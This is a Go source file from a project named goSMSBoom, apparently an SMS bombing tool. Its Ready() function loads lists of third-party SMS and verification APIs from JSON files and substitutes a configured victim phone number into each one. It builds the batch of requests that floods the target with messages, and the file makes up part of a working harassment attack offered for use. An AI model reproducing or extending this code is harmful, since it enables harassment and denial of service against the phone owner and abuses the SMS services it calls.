package attack

import (
	"encoding/json"
	"goSMSBoom/config"
	"goSMSBoom/log"
	"goSMSBoom/model"
	"goSMSBoom/utils"
	"strings"
)

// Ready 准备要发送的短信信息
func Ready() ([]*model.SMSBoom, error) {

	// 获取phones.json数据
	arr, err := utils.GetFileByteArr("./json/phoneApi.json")
	if err != nil {
		log.Println("获取phones.json失败", err)
		return nil, err
	}

	var phoneURLArr []string
	err = json.Unmarshal(arr, &phoneURLArr)
	if err != nil {
		log.Println("json解析失败", err)
		return nil, err
	}

	for i := range phoneURLArr {
		url := phoneURLArr[i]
		split := strings.Split(url, "?imid=")
		phoneMessage := model.NewPhoneMessage(config.Configs.Content, split[1], config.Configs.SSID)
		ConcurrentPhoneArray = append(ConcurrentPhoneArray, phoneMessage)
	}

	// 获取api.json数据
	httpInfo, err := utils.GetFileByteArr("./json/api.json")
	if err != nil {
		log.Println("解析api.json失败", err)
		return nil, err
	}

	// 获取getApi.json数据
	getApi, err := utils.GetFileByteArr("./json/GETAPI.json")
	if err != nil {
		log.Println("GETAPI.json", err)
		return nil, err
	}
	var sms []*model.SMSBoom
	s := string(httpInfo)
	s = strings.ReplaceAll(s, "[phone]", config.Configs.Phone)
	err = json.Unmarshal([]byte(s), &sms)
	if err != nil {
		log.Println("json解析失败", err)
		return nil, err
	}
	var sms2 []*model.SMSBoom
	var sArr []string
	s2 := string(getApi)
	s2 = strings.ReplaceAll(s2, "[phone]", config.Configs.Phone)
	err = json.Unmarshal([]byte(s2), &sArr)
	for i := range sArr {
		sms2 = append(sms2, model.NewSMSBoom("不知名商家", sArr[i], "GET", nil, nil))
	}
	sms = append(sms, sms2...)
	if err != nil {
		log.Println("json解析失败", err)
		return nil, err
	}

	return sms, nil
}
